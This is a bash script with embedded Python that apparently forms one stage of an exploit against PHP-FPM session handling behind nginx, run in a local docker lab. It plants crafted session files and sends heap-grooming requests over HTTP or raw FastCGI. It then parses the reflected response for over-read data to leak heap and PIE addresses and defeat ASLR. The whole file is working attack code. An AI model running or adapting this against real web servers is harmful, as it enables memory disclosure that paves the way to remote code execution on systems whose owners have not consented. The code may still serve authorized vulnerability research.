#!/usr/bin/env bash
# Attempt the heap/PIE leak over HTTP. TRANSPORT=raw (direct fcgi 9003) or
# http (nginx 9005). SINK=get (echo.php, query-string groom) or
# post (post.php, QS_IN_BODY groom in the multipart body).
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
NAME=p2s-native
FCGI_PORT=9003
NGINX_URL=${NGINX_URL:-http://127.0.0.1:9005}
A=11111111111111111111111111111111
LB=22222222222222222222222222222222
TRANSPORT=${TRANSPORT:-http}
SINK=${SINK:-post}
N2P=${N2P:-12}
VLEN=${VLEN:-4088}
OUT=${OUT:-/tmp/leakprobe.bin}

printf 'a|i:12345;b|i:12345678901234;c|i:12345678901234;d|i:12345678901234;e|i:123456789012345;' > /tmp/native_small
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker cp /tmp/native_small "$NAME:/tmp/sess_$LB" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A" "/tmp/sess_$LB"

PRE=${PRE:-24576}
A_URL="$NGINX_URL/fpm_sess_split2.php?pre=$PRE&pad=1490900&hole=4096"
curl --max-time 30 -s -o /dev/null -w "[leak] A http=%{http_code}\n" -b "PHPSESSID=$A" "$A_URL"

if [ "$SINK" = get ]; then SCRIPT=/var/www/html/echo.php; else SCRIPT=/var/www/html/post.php; fi

if [ "$TRANSPORT" = raw ]; then
    # raw fcgi: fcgi_split has no QS_IN_BODY, so SINK=get only here
    python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$LB" feffffffffffffff 0 0 0 "$VLEN" "$N2P" \
        "$SCRIPT" "$OUT" >/dev/null 2>&1 || true
else
    if [ "$SINK" = post ]; then export QS_IN_BODY=1; fi
    python3 -I "$HERE/http_deliver.py" "$NGINX_URL" "$LB" feffffffffffffff 0 0 0 "$VLEN" "$N2P" \
        "$SCRIPT" "$OUT" 2>&1 || true
fi

echo "[leak] response saved to $OUT ($(wc -c < "$OUT" 2>/dev/null || echo 0) bytes)"
python3 - "$OUT" <<'PY'
import struct, sys
d=open(sys.argv[1],'rb').read()
lines={}
for ln in d.split(b'\n'):
    if b':' in ln:
        k,_,v=ln.partition(b':')
        lines[k]=v
# report length of each reflected var (hex len/2)
over=[]
for k,v in lines.items():
    try: n=len(bytes.fromhex(v.decode()))
    except Exception: n=-1
    if n>6000: over.append((k.decode(errors='replace'),n))
print("reflected vars:",{k.decode(errors='replace'):len(v)//2 for k,v in lines.items() if len(v)<200})
print("OVER-READ vars (>6KB):",over)
# try the run_native parser on v5
raw=None
for ln in d.split(b'\n'):
    if ln.startswith(b'v5:'):
        try: raw=bytes.fromhex(ln[3:].decode())
        except Exception: raw=None
        break
if raw is None:
    print("v5 sink: none"); sys.exit()
print("v5 raw bytes:",len(raw))
if len(raw)<0x3010:
    print("v5 too short for PIE@0x3008");
heap=None
for off in range(0,len(raw)-8,8):
    q=struct.unpack_from('<Q',raw,off)[0]
    if 0x100000000000<q<0x800000000000 and (q&0xfff)==0x428:
        heap=q; break
pie=struct.unpack_from('<Q',raw,0x3008)[0] if len(raw)>=0x3010 else 0
print("heap=%s pie=%#x pie_low12=%#x"%(hex(heap) if heap else None, pie, pie&0xfff))
if heap and pie>0x100000000000 and (pie&0xfff)==0x777:
    print("LEAK_OK heap=%#x pie=%#x"%(heap,pie))
else:
    print("LEAK_FAIL")
PY